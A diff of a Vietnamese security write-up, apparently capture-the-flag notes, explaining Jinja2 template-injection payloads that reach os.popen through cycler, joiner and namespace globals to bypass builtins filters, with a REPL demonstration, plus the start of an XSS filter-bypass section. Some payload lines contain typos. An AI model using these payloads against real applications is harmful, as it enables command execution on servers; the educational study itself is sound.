@@ -163,7 +163,17 @@ Từ đây ta có thể tự hiểu và xây được những payload chính g�
 {{ self.__TemplateReference__context.cycler.__init__.__globals__os.popen('cmd').read() }}
 {{ self.__TempalteReference__context.joiner.__init__.__globals__os.popen('cmd').read() }}
 {{ self.__TemplateReferecne__context.namespace.__init__.gloabls__os.popen('cmd').read() }}
+
+Nhưng mà tại sao đề cập đến hàm builtins ở trên mà ở dưới lại kh dùng nhỉ? Thì bởi vì hàm builtins thường xuyên bị hạn chế hoặc bị lọc đi mất, nên chúng ta
+phải tìm được 1 giải pháp để vẫn có thể import được os mà kh cần dùng đến hàm builitins để sử dụng import ra module os. Ở đây giải pháp là tìm ra nơi mà module os này đã được nhập. Dựa vào cái TemplateReference đã được ở trên thì có 1 internal attribute khá thú vị mà ta sử dụng ở bên trên là:
+self.__TemplateReference__context, attribute này cho phép ta truy cập 3 biến cycler,joiner và namespace được hiển thị trong utils.py file nơi mà os module được import. Từ đây ta có thể gọi được ra biến os.
+
 ```
+>>> jinja2.Template("My name is {{ e(self._TemplateReference__context) }}").render(e=lambda x:vars(x))
+"My name is {'parent': {'range': <class 'range'>, 'dict': <class 'dict'>, 'lipsum': <function generate_lorem_ipsum at 0x7f62df526940>, 'cycler': <class 'jinja2.utils.Cycler'>, 'joiner': <class 'jinja2.utils.Joiner'>, 'namespace': <class 'jinja2.utils.Namespace'>, 'e': <function <lambda> at 0x7f62de305790>}, 'vars': {}, 'environment': <jinja2.environment.Environment object at 0x7f62dfded040>, 'eval_ctx': <jinja2.nodes.EvalContext object at 0x7f62de22b760>, 'exported_vars': set(), 'name': None, 'blocks': {}}"
+ 
+ > Reference: https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/#the-templatereference-object
+
 
 ## 2. XSS DOM Based - Filters Bypass
 Mở đầu vào ta có giao diện như sau, có thể nhập 1 số hay chữ bất kì vào, check source:
